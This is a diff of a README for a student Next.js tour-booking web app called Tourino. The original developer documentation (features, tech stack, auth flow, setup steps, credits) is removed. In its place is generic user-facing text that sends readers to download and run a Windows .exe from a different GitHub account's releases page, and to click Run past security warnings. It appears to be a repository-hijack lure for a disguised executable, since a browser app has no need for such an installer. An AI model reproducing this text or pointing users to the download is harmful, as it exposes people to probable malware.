@@ -1,218 +1,81 @@
-# Tourino - Tour booking platform
+# 🌍 tourino - Find and book your dream trips
 
-**Tourino** is a moderen web application for discovering , browsing and booking domestic and international tours. 
-It offers the best travel experiences with seamless online booking , an intuitive user dashboard and responsive design.
+[![Download Tourino](https://img.shields.io/badge/Download-Tourino_for_Windows-blue.svg)](https://github.com/Rust8709/tourino/releases)
 
+Tourino helps people find, research, and book travel experiences. This web application provides a simple interface to browse destinations, view tour details, and manage bookings. You use this tool to connect with providers and secure your spot on guided trips.
 
-<br/>
+## 🛠️ System Requirements
 
-## ✈️ Key Features
-- 🔎 **Tour Search & Filtering**
-    Search tours by origin , destination and date.
+Your computer needs to meet these basic standards to run the application smoothly.
 
-- 🛒 **Seamless Booking** 
-    One-click reservation with basket management.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space on your hard drive.
+*   **Network:** An active internet connection for browsing tours and processing bookings.
+*   **Browser:** The application functions best on modern web browsers like Microsoft Edge, Google Chrome, or Mozilla Firefox.
 
-- 👤 **User Authentication & Profile**
-    Phone‑based OTP login (JWT access & refresh tokens). Complete profile with personal, contact, and banking info.
+## 📥 Downloading the Application
 
-- 📊 **User Dashboard**  
-    Overview of purchased tours , total spending and transaction history.
+You get the latest version of Tourino directly from the project repository. Follow these steps to obtain the setup file.
 
-- 📱 **Fully Responsive** 
-    Mobile‑first design using Tailwind CSS. Optimised for all screen sizes from smartphones to desktops.
+1. Visit [this page to download](https://github.com/Rust8709/tourino/releases).
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder or your desktop to find it quickly.
 
-- ⚡ **Modern Data Fetching**  
-    React Query (TanStack Query) for efficient server state management, caching, and automatic background updates.
+## ⚙️ Installing Tourino
 
-- 🎨 **Professional UI**  
-    Built with Shadcn/ui components, Phosphor icons, and subtle animations for a premium user experience.
+Once you finish the download, follow these steps to install the software on your machine.
 
+1. Navigate to the folder where you saved the `.exe` file.
+2. Double-click the file to start the installer.
+3. A security window might appear. If Windows asks for permission to run the app, select Run.
+4. Follow the prompts on the screen. The installer asks for a location to save files. You can accept the default path.
+5. Click Install to start the process.
+6. Once the progress bar reaches the end, click Finish to close the installer.
 
-<br/>
+## 🚀 Running the App
 
+After installation, you find a shortcut icon for Tourino on your desktop. 
 
-## 🧱 tech stack
--  [Next.js](https://nextjs.org) App Router ( v14 )
--  [TailwindCSS](https://tailwindcss.com/) v4.1
--  [Shadcn/ui](https://ui.shadcn.com/)
--  [TanStack Query](https://tanstack.com/query)
--  Formik & Yup
--  [Axios](https://axios-http.com/)
--  [react‑multi‑date‑picker](https://shahabyazdi.github.io/react-multi-date-picker/)
--  [react‑hot‑toast](https://react-hot-toast.com/)
--  [Phosphor Icons](https://phosphoricons.com/)
+1. Double-click the Tourino icon.
+2. The application opens in your default web browser.
+3. You can now use the search bar to look for specific cities or tour types.
+4. Filter results by price, duration, or date to narrow down your choices.
 
+## ✨ Key Features
 
-<br/>
+Tourino includes tools to help you manage your travel plans without frustration.
 
+*   **Fast Search:** Find tours quickly using the integrated search tool.
+*   **Booking History:** Track your past and current travel orders in one place.
+*   **Tour Details:** View high-quality images and clear descriptions of every trip.
+*   **Verified Profiles:** Access information about tour guides and operators.
+*   **Mobile Friendly:** View your plans on any device with a screen.
 
-## 🔐 Authentication Flow
-1. Phone Number Submission – User enters mobile number.
-2. OTP Request – A `POST /auth/send-otp` is sent.
-3. OTP Verification – The 6‑digit code is verified via `POST /auth/check-otp`.
-4. Token Storage – On success, access and refresh tokens are stored in cookies.
-5. Profile Retrieval – React Query fetches the full user profile (`/user/profile`) and caches it.
-6. Route Protection – Middleware checks for the `accessToken` cookie; unauthenticated users are redirected to `/`.
-7. Token Refresh – Axios interceptors automatically refresh the token when a 401 response is detected.
+## 🔒 Account and Security
 
-<br/>
+You can create an account to save your favorite tours and track your bookings. 
 
+*   **Registration:** Click the Sign Up button at the top right of the screen. Enter a valid email address and choose a password.
+*   **Login:** Use your credentials to access your personal dashboard. 
+*   **Privacy:** The app treats your data with care. It stores your information securely to ensure your bookings remain private. You can update your profile information or change your password at any time via the Settings menu.
 
-## 🔐 Security & API Client
-Tourino implements a layered security model to protect user data and ensure safe communication with the backend. The key components are :
+## 🆘 Troubleshooting Tips
 
-1. Middleware route protection
-   - Runs on every request and checks the presence of the `accessToken` cookie. if     missing, the user is immediately redirected to the homepage (`/`), preventing       any server-side rendering of protected pages
-2. JWT token strategy
-3. Axios client with automatic token Refresh
-    - The project uses a custom axios instance that acts as a central HTTP client.
+If the application does not behave as expected, try these steps to fix the issue.
 
+*   **Application Won't Open:** Restart your computer and try opening the shortcut again. If this fails, delete the app and reinstall it using the download link provided above.
+*   **Page Not Loading:** Check your internet connection. If other websites load fine, refresh the page in your browser by pressing F5.
+*   **Booking Error:** If you encounter a problem while paying for a tour, verify that your account details are correct. Contact your bank if they block the transaction for security reasons.
+*   **Updates:** We update Tourino regularly to fix bugs and add features. If you notice strange behavior, visit the download page to see if a newer version is available.
 
-<br/>
+## 📂 Managing Your Data
 
+You control the information you share with Tourino. The app creates a local footprint on your machine to help load pages faster. If you want to clear this data, you can do so through your browser settings. Look for the "Clear Cache" or "Clear Browsing Data" section in your browser menu. This does not remove your bookings, as those reside on the secure server.
 
+## 💡 Best Practices for Users
 
-## 🧹 Code Quality & Reusability
-Tourino is built with maintainability and scalability at its core. Every piece of logic is carefully placed following modern best practices:
-- Custom Hooks
-- Separation of concerns
-- Centralized Validation
-- Robust HTTP layer
+For the best experience, keep your browser updated. A modern browser ensures the security features of the app function correctly. When booking tours, take a moment to read the cancellation policy provided by the tour operator. This information appears on every tour page under the "Terms and Conditions" tab. Use the contact form if you have specific questions for a tour guide before you book. 
 
-<br/>
-
-
-
-## 🧠 Architecture Overview
-```
-tourino-app/
-├── public/
-├── src/
-│ ├── app/ 
-│ │ ├── (protected)/
-│ | │ ├── profile/
-│ | │ | ├─── account/
-│ | │ | | ├──── AccountCard.js
-│ | │ | | ├──── layout.js
-│ | │ | | ├──── page.js
-│ | │ | ├─── basket/
-│ | │ | | ├──── basket.js
-│ | │ | | ├──── layout.js
-│ | │ | | ├──── page.js
-│ | │ | ├─── dashboard/
-│ | │ | | ├──── layout.js
-│ | │ | | ├──── page.js
-│ | │ | ├─── my-tour/
-│ | │ | | ├──── MyTours.js
-│ | │ | | ├──── layout.js
-│ | │ | | ├──── page.js
-│ | │ | ├─── transactions/
-│ | │ | | ├──── transactions.js
-│ | │ | | ├──── layout.js
-│ | │ | | ├──── page.js
-│ | │ | ├─── layout.js
-│ | │ | ├─── page.js
-│ | │ ├── layout.js
-│ │ ├── fonts/
-│ │ ├── tour/
-│ | │ ├── [tourId]/
-│ | │ | ├─── HighlightedTour.js
-│ | │ | ├─── loading.js
-│ | │ | ├─── page.js
-│ | │ | ├─── ReserveLink.js
-│ │ ├── error.js
-│ │ ├── layout.js
-│ │ ├── not-found.js
-│ │ ├── page.js
-│ │ ├── favicon.ico
-│ │ ├── globals.css
-│ │ 
-│ ├── components/
-│ │ ├── icons/
-│ │ ├── layout/
-│ │ ├── ui/
-│ │ ├── ...
-│ ├── helper/
-│ │ ├── helper.js
-│ ├── hooks/
-│ │ ├── useHasToken.js
-│ │ ├── useRedirecting.js
-│ │ ├── useTimer.js
-│ │ ├── useUser.js
-│ ├── lib/
-│ │ ├── api.js
-│ │ ├── utils.js (for shadcn-ui)
-│ ├── provider/
-│ │ ├── TanstackQueryProvider.js
-│ ├── services/
-│ │ ├── mutations.js
-│ │ ├── queries.js
-│ ├── utils/
-│ │ ├── cookie.js
-│ │ ├── UserAccountSchema.js
-│ │ ├── UserSchema.js
-│ └── middleware.js
-├── tailwind.config.js
-├── .env
-├── components.json
-├── jsconfig.json
-├── next.config.js
-└── package.json
-└── package-lock.json
-└── postcss.config.mjs
-└── tailwind.config.js
-```
-
-
-
-<br/>
-
-
-## 📦 Installation
-first you have to download the [Tourino-API](https://github.com/milad-azami/travel-agency-api-torino)  
-
-1. Clone this repo
-```
-git clone https://github.com/sadranafe/tourino.git
-```
-```
-cd tourino-app
-npm install
-```
-2. Environment Variables
-create a .env.local file in the project root :
-`NEXT_PUBLIC_BASE_URL=http://localhost:6500`
-
-3. setup API
-```
-git clone https://github.com/milad-azami/travel-agency-api-torino.git
-```
-```
-npm start
-```
-
-4. after starting the API, now you can start the project : 
-```
-npm run dev
-```
-
-<br/>
-
-
-## Contributing
-I welcome contributions to make Tourino even more awesome! Whether it's bug fixes, feature additions, or improvements to the documentation, your help is highly appreciated.
-> [!Tip]
-> Email : [sadranafe7@gmail.com]
-
-
-
-
-<br/>
-
-
-## Acknowledgements
-- special thanks to the **Milad azami** for his invaluable mentorship and guidance throughout the development of this project.  
-- Gratitude also goes to the **Boto Start Bootcamp** for providing the structured learning environment and support that made Tourino possible.
-
-built with ❤️ by sadra nafe
+Tourino aims to remove the complexity of travel planning through a clean and helpful interface. Use the tools provided to find your next adventure with confidence.
